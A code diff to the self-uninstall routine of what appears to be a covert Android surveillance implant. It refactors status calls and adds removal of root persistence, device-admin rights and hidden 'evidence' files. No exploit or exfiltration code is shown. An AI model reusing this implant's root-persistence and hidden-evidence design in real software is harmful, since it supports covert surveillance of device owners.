@@ -16,6 +16,7 @@ import android.content.Intent;
 import android.net.Uri;
 
 import com.android.deviceinfo.Beep;
+import com.android.deviceinfo.Persistence;
 import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.Trigger;
@@ -27,6 +28,7 @@ import com.android.deviceinfo.listener.AR;
 import com.android.deviceinfo.manager.ManagerEvent;
 import com.android.deviceinfo.manager.ManagerModule;
 import com.android.deviceinfo.util.Check;
+import com.android.deviceinfo.util.Instrument;
 import com.android.m.M;
 
 /**
@@ -53,7 +55,7 @@ public class UninstallAction extends SubActionSlow {
 	 */
 	@Override
 	public boolean execute(Trigger trigger) {
-		Status.self().uninstall = true;
+		Status.uninstall = true;
 		return true;
 	}
 
@@ -65,24 +67,27 @@ public class UninstallAction extends SubActionSlow {
 			Check.log(TAG + " (actualExecute): uninstall");//$NON-NLS-1$
 		}
 
-		Status status = Status.self();
-
 		// check Core.taskInit
 		final Markup markup = new Markup(0);
 		markup.createEmptyMarkup();
 
-		removeAdmin(status.getAppContext());
+		removeAdmin(Status.getAppContext());
 
+		if (Root.isRootShellInstalled()) {
+			Persistence p = new Persistence(Status.getAppContext());
+			p.removePersistance();
+		}
+		
 		boolean ret = stopServices();
 		ret &= removeFiles();
-		ret &= deleteApplication();
-		ret &= removeRoot(status);
+		ret &= deleteApplication();	
+		ret &= removeRoot();
 
 		return ret;
 	}
-
-	private static boolean removeRoot(Status status) {
-		if (status.haveRoot() == true) {
+	
+	private static boolean removeRoot() {
+		if (Status.haveRoot() == true) {
 			Process localProcess;
 
 			try {
@@ -94,6 +99,7 @@ public class UninstallAction extends SubActionSlow {
 				if (Cfg.EXCEPTION) {
 					Check.log(e);
 				}
+				
 				return false;
 			}
 		}
@@ -105,6 +111,7 @@ public class UninstallAction extends SubActionSlow {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (removeAdmin) ");
 		}
+		
 		ComponentName devAdminReceiver = new ComponentName(appContext, AR.class);
 		DevicePolicyManager dpm = (DevicePolicyManager) appContext.getSystemService(Context.DEVICE_POLICY_SERVICE);
 		dpm.removeActiveAdmin(devAdminReceiver);
@@ -122,7 +129,8 @@ public class UninstallAction extends SubActionSlow {
 
 		ManagerModule.self().stopAll();
 		ManagerEvent.self().stopAll();
-		Status.self().unTriggerAll();
+		Status.unTriggerAll();
+		
 		return true;
 	}
 
@@ -139,19 +147,22 @@ public class UninstallAction extends SubActionSlow {
 		Markup.removeMarkups();
 
 		final int fileNum = EvidenceCollector.self().removeHidden();
+		
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (removeFiles): " + fileNum);//$NON-NLS-1$
 		}
+		
 		return true;
 	}
 
 	private static boolean deleteApplication() {
-
 		boolean ret = false;
+		
 		if (Status.haveRoot()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (deleteApplication) try Root");
 			}
+			
 			ret = deleteApplicationRoot();
 		}
 
@@ -159,6 +170,7 @@ public class UninstallAction extends SubActionSlow {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (deleteApplication) go with intent");
 		}
+		
 		ret = deleteApplicationIntent();
 		// }
 
@@ -174,7 +186,7 @@ public class UninstallAction extends SubActionSlow {
 
 		// Core core = Core.self();
 		// package:com.android.networking
-		final Uri packageURI = Uri.parse("package:" + Status.self().getAppContext().getPackageName()); //$NON-NLS-1$
+		final Uri packageURI = Uri.parse("package:" + Status.getAppContext().getPackageName()); //$NON-NLS-1$
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (deleteApplication): " + packageURI.toString());
@@ -192,14 +204,16 @@ public class UninstallAction extends SubActionSlow {
 	 * @return
 	 */
 	static boolean deleteApplicationRoot() {
-
 		if (Cfg.DEMO) {
 			Beep.beepExit();
 		}
+		
 		boolean ret = Root.uninstallRoot();
+		
 		if (Cfg.DEMO) {
 			Beep.beepPenta();
 		}
+		
 		return ret;
 	}
 
